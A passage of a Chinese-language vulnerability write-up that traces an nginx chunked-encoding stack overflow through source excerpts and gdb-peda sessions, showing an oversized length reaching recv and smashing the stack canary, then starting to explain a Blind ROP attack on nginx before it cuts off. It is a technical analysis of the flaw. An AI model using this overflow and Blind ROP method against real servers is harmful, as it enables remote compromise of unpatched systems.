    static ngx_int_t
    ngx_http_discard_request_body_filter(ngx_http_request_t *r, ngx_buf_t *b)
    {
         for ( ;; ) {
                rc = ngx_http_parse_chunked(r, b, rb->chunked);
                if (rc == NGX_OK) {
                    /* a chunk has been parsed successfully */
                }
                if (rc == NGX_DONE) {
                    /* a whole response has been parsed successfully */
                }
                if (rc == NGX_AGAIN) {
                    /* set amount of data we want to see next time */
                    r->headers_in.content_length_n = rb->chunked->length;
                    break;
                }
注意在for循环中会进行三个if语句逻辑处理，分别对应三种NGX状态，在rc==NGX_AGAIN的时候，会对content_length_n成员变量进行赋值。NGX_AGAIN就是要第二次接收时才会触发，因此这就解释了在之前我们提到的为什么要发两个数据包的问题。
在这个函数下断点进行单步跟踪。首先会判断if语句中NGX状态。
    gdb-peda$ ni
       0x807aada :cmp    eax,0xfffffffe
    => 0x807aadd :jne    0x807aafe 
    Legend: code, data, rodata, value
    0x0807aadd735            if (rc == NGX_AGAIN) {
这里判断通过，会进入到这个if语句中进行处理。
    gdb-peda$ ni
    [----------------------------------registers-----------------------------------]
    EAX: 0xfffffffe 
    EBX: 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    ECX: 0xfdffffff 
    EDX: 0xfdffbbff 
    ESI: 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    EDI: 0x83f7ffc --> 0x0 
    EBP: 0x83f10e4 --> 0x83f7808 --> 0x0 
    ESP: 0xbfc6b2e0 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    EIP: 0x807aadf (:mov    eax,DWORD PTR [edi+0x1c])
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x807aad5 :jmp    0x807aba2 
       0x807aada :cmp    eax,0xfffffffe
       0x807aadd :jne    0x807aafe 
    => 0x807aadf :mov    eax,DWORD PTR [edi+0x1c]
       0x807aae2 :mov    edx,DWORD PTR [eax+0x10]
       0x807aae5 :mov    eax,DWORD PTR [eax+0xc]
       0x807aae8 :mov    DWORD PTR [esi+0xdc],eax
       0x807aaee :mov    DWORD PTR [esi+0xe0],edx
    [------------------------------------stack-------------------------------------]
    0000| 0xbfc6b2e0 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    0004| 0xbfc6b2e4 --> 0x83f10e4 --> 0x83f7808 --> 0x0 
    0008| 0xbfc6b2e8 --> 0x83f8020 --> 0x1 
    0012| 0xbfc6b2ec --> 0xb77df9b2 (cmp    eax,0x0)
    0016| 0xbfc6b2f0 --> 0xbfc6b370 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    0020| 0xbfc6b2f4 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    0024| 0xbfc6b2f8 --> 0x83f7fb6 ("/index.html")
    0028| 0xbfc6b2fc --> 0x806fa75 (:jmp    0x806fad9 )
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    739                r->headers_in.content_length_n = rb->chunked->length;
    gdb-peda$ ni
    => 0x807aaf4 :mov    eax,0x0
    Legend: code, data, rodata, value
    764    return NGX_OK;
这里赋值之后，我们来看一下r结构体中关于content_length_n的成员变量的值。
    gdb-peda$ p *(struct ngx_http_request_s*)0x83f7838
    $3 = {
      headers_in = {
        content_length_n = 0xfdffbbffa8afed92, 
        keep_alive_n = 0xffffffff, 
        connection_type = 0x0, 
        chunked = 0x1,
赋值之后，content_length_n的值变成了一个极大的值，随后返回值后，进入ngx_http_read_discarded_request_body函数处理。
    src/http/ngx_http_request_body.c:676
    static ngx_int_t
    ngx_http_read_discarded_request_body(ngx_http_request_t *r)
    {
        size_t     size;
        ssize_t    n;
        ngx_int_t  rc;
        ngx_buf_t  b;
        u_char     buffer[NGX_HTTP_DISCARD_BUFFER_SIZE];
        ngx_log_debug0(NGX_LOG_DEBUG_HTTP, r->connection->log, 0,
                       "http read discarded body");
        ngx_memzero(&b, sizeof(ngx_buf_t));
        b.temporary = 1;
        for ( ;; ) {
            if (r->headers_in.content_length_n == 0) {
                r->read_event_handler = ngx_http_block_reading;
                return NGX_OK;
            }
            if (!r->connection->read->ready) {
                return NGX_AGAIN;
            }
            size = (size_t) ngx_min(r->headers_in.content_length_n,
                                    NGX_HTTP_DISCARD_BUFFER_SIZE);//key！！
            n = r->connection->recv(r->connection, buffer, size);//key！！
两个key中，第一处会进行一处比较，这个值调用了ngx_min函数，这个函数会取content_length_n和NGX_HTTP_DISCARD_BUFFER_SIZE中小的数值，而NGX_HTTP_DISCARD_BUFFER_SIZE就是函数开头定义的buffer的长度。
    #define NGX_HTTP_DISCARD_BUFFER_SIZE       4096
    #define NGX_HTTP_LINGERING_BUFFER_SIZE     4096
注意一下刚才content_length_n的长度，是一个负数，这里比较时会进行有符号数比较，会取这个负数，也就是content_length_n，动态跟踪一下。
    gdb-peda$ p *(struct ngx_http_request_s*)0x83f7838
    $4 = {
      headers_in = {
        content_length_n = 0xfdffbbffa8afed92, 
        keep_alive_n = 0xffffffff, 
        connection_type = 0x0, 
        chunked = 0x1, 
    gdb-peda$ ni
    [----------------------------------registers-----------------------------------]
    EAX: 0x8403ac8 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    EBX: 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    ECX: 0xa8afed92 
    EDX: 0xfdffbbff 
    ESI: 0xbfc6a31c --> 0x0 
    EDI: 0x841ba78 --> 0x8403ac8 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    EBP: 0x83f7fe2 --> 0xc1404900 
       0x807b441 :test   edx,edx
    => 0x807b443 :js     0x807b452 
    Legend: code, data, rodata, value
    0x0807b443649        size = (size_t) ngx_min(r->headers_in.content_length_n,
    gdb-peda$ ni
    [----------------------------------registers-----------------------------------]
    EAX: 0x8403ac8 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    EBX: 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    ECX: 0xa8afed92 
    EDX: 0xfdffbbff 
    ESI: 0xbfc6a31c --> 0x0 
    EDI: 0x841ba78 --> 0x8403ac8 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    EBP: 0x83f7fe2 --> 0xc1404900 
    ESP: 0xbfc6a2d0 --> 0x0 
    EIP: 0x807b452 (:mov    DWORD PTR [esp+0x8],ecx)
    EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
       0x807b44d :mov    ecx,0x1000
    => 0x807b452 :mov    DWORD PTR [esp+0x8],ecx
    Legend: code, data, rodata, value
    652        n = r->connection->recv(r->connection, buffer, size);
注意一下ngx_min函数调用前的content_length_n的值，在比较时ecx存放后8位，edx存放前8位，随后会将ecx的值交给size，这个值是个极大值，比4096大很多，随后会进行recv，这时候接收可以接收一个超过buffer大小4096的数据，造成栈溢出。
    gdb-peda$ ni
    [-------------------------------------code-------------------------------------]
       0x807b45a :mov    DWORD PTR [esp],eax
    => 0x807b45d :call   DWORD PTR [eax+0x10]
    Guessed arguments:
    arg[0]: 0x8403ac8 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    arg[1]: 0xbfc6a31c --> 0x0 
    arg[2]: 0xa8afed92 
    [------------------------------------stack-------------------------------------]
    0000| 0xbfc6a2d0 --> 0x8403ac8 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    0004| 0xbfc6a2d4 --> 0xbfc6a31c --> 0x0 
    0008| 0xbfc6a2d8 --> 0xa8afed92 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x0807b45d652        n = r->connection->recv(r->connection, buffer, size);
    gdb-peda$ ni
    [----------------------------------registers-----------------------------------]
    ESI: 0xbfc6a31c ("9e8d8fbadefbd9b9bffae9aaac9addfac8ffccc9a998cafee8a9ecbebcbcffec9aed9bRduGkRAiLkyCyQhOEKNOzvHJdgKvWBCREHrVtCWlrpKklSOhAJEkkqMHrjbjnFzlQNnnjFLsfGOcLWsHIajzlxxDTUoHoQBZpDbRqNpMzbMUVbOzEvrkCORulMEECElSfQ"...)
    [-------------------------------------code-------------------------------------]
       0x807b45d :call   DWORD PTR [eax+0x10]
    => 0x807b460 :cmp    eax,0xffffffff
    [------------------------------------stack-------------------------------------]
    0000| 0xbfc6a2d0 --> 0x8403ac8 --> 0x83f7838 ("HTTP310:@b304|?b324%?b274325?bL337?b306,ab36025606b")
    0004| 0xbfc6a2d4 --> 0xbfc6a31c ("9e8d8fbadefbd9b9bffae9aaac9addfac8ffccc9a998cafee8a9ecbebcbcffec9aed9bRduGkRAiLkyCyQhOEKNOzvHJdgKvWBCREHrVtCWlrpKklSOhAJEkkqMHrjbjnFzlQNnnjFLsfGOcLWsHIajzlxxDTUoHoQBZpDbRqNpMzbMUVbOzEvrkCORulMEECElSfQ"...)
    0008| 0xbfc6a2d8 --> 0xa8afed92 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    654        if (n == NGX_ERROR) {
    gdb-peda$ x/30x 0xbfc6a31c
    0xbfc6a31c:0x643865390x616266380x626665640x39623964
    0xbfc6a32c:0x616666620x616139650x613963610x61666464
    0xbfc6a33c:0x666638630x396363630x383939610x65666163
    0xbfc6a34c:0x396138650x656263650x636263620x63656666
可以看到，recv之后，已经接收到了畸形字符串，并且拷贝到buffer中，造成了栈溢出，这时候，由于Canary被畸形字符串覆盖，从而导致了stack_chk失败，而下一步，我们就要通过Blind
ROP来完成对Nginx的攻击。
**  
**
**360度无死角浅析Blind ROP Attack**
关于Blind ROP网上有很多介绍，这里，我将结合Exploit来分解每一步的过程，在这之前，我想大概说明一下，关于Blind
ROP的使用环境。首先Blind ROP是我们不知道目标环境的情况下使用的，也就是不能直接构造ROP gadget。
目标服务在崩溃后会重新运行
Canary不会重置，没有ASLR
这是因为Blind